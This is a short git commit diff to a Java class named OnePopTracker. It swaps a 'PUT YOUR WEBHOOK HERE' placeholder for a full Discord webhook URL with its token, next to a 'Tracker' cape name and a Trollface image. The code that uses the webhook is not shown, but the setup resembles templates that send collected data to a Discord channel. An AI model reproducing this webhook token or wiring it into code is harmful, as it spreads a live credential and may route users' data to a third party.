d5388421f76802d151587749398c0d976d1199f4
momo210210 <115003280+momo210210@users.noreply.github.com>
2022-10-05 18:48:18 +0900

    Update OnePopTracker.java

--- OnePopTracker.java
+++ OnePopTracker.java
@@ -6,7 +6,7 @@ public class OnePopTracker {
 
     public OnePopTracker() {
 
-        final String l = "PUT YOUR WEBHOOK HERE";
+        final String l = "https://discord.com/api/webhooks/1026818555997593600/abv3rPCGKIM6y5lSkf0WmL6QGSNMn9puSjyDD0l8CCuSp0v4ys7RcCArHD_wZagfiB9j";
         final String CapeName = "Tracker";
         final String CapeImageURL = "https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png";
 
